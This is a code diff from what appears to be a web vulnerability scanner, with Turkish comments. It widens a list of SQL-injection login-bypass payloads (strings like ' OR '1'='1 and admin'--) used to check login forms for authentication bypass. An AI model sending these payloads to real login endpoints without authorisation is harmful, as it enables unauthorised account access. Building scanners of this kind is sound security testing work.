@@ -105,7 +105,9 @@ export async function collectJwtAnalysis(host: string, session: AuthSession): Pr
 }
 
 // ---- Giriş baypası (SQLi göstergesi) ----------------------------------------------------
-const SQLI_LOGIN_PAYLOADS = [`' OR '1'='1`, `' OR 1=1--`, `admin'--`];
+// (Form-POST agresiflik) giriş baypası payload çeşitliliği artırıldı — hepsi salt kimlik-doğrulama
+// atlatma göstergesi arar; oturum ele geçirilmez/kullanılmaz. Kayıt oluşturmaz (login ucu).
+const SQLI_LOGIN_PAYLOADS = [`' OR '1'='1`, `' OR 1=1--`, `admin'--`, `' OR '1'='1'-- -`, `") OR ("1"="1`, `' OR 'a'='a`, `admin' #`];
 const TOKEN_INDICATOR_RE = /"(token|authentication|jwt|access_token|accessToken|bearer)"\s*:/i;
 const LOGIN_FAIL_RE = /(invalid|hatal|geçersiz|unauthor|yanlış|incorrect|denied|reddedil|401|403)/i;
 
